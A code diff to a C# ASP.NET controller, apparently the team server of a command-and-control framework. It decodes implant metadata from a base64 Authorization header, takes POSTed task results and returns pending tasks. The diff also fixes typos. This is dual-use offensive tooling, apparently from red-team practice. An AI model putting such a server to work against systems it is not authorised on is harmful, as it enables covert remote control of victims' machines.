@@ -1,10 +1,13 @@
 ﻿using Microsoft.AspNetCore.Http;
 using Microsoft.AspNetCore.Mvc;
-using TeamServer.Models.Agents;
-using TeamServer.Services;
-using System;
 using Newtonsoft.Json;
+
+using System;
+using System.Collections.Generic;
+using System.IO;
 using System.Text;
+using System.Threading.Tasks;
+using TeamServer.Services;
 
 namespace TeamServer.Models
 {
@@ -18,9 +21,9 @@ namespace TeamServer.Models
             _agents = agents;
         }
 
-        public IActionResult HandleImplant()
+        public async Task<IActionResult> HandleImplant()
         {
-            var metadata = ExtractMetada(HttpContext.Request.Headers);
+            var metadata = ExtractMetadata(HttpContext.Request.Headers);
             if (metadata is null) return NotFound();
 
             var agent = _agents.GetAgent(metadata.Id);
@@ -33,19 +36,32 @@ namespace TeamServer.Models
 
             agent.CheckIn();
 
+            if (HttpContext.Request.Method == "POST")
+            {
+                string json;
+
+                using (var sr = new StreamReader(HttpContext.Request.Body))
+                {
+                    json = await sr.ReadToEndAsync();
+                }
+
+                var results = JsonConvert.DeserializeObject<IEnumerable<AgentTaskResult>>(json);
+                agent.AddTaskResults(results);
+            }
+
             var tasks = agent.GetPendingTasks();
             return Ok(tasks);
         }
 
-        private AgentMetadata ExtractMetada(IHeaderDictionary headers)
+        private AgentMetadata ExtractMetadata(IHeaderDictionary headers)
         {
-            if (!headers.TryGetValue("Authorization", out var encodeMetadata))
+            if (!headers.TryGetValue("Authorization", out var encodedMetadata))
                 return null;
 
-            // Authorization: Bearer <base64>
-            encodeMetadata = encodeMetadata.ToString().Remove(0, 7);
+            // Authorziation: Bearer <base64>
+            encodedMetadata = encodedMetadata.ToString().Remove(0, 7);
 
-            var json = Encoding.UTF8.GetString(Convert.FromBase64String(encodeMetadata));
+            var json = Encoding.UTF8.GetString(Convert.FromBase64String(encodedMetadata));
             return JsonConvert.DeserializeObject<AgentMetadata>(json);
         }
     }
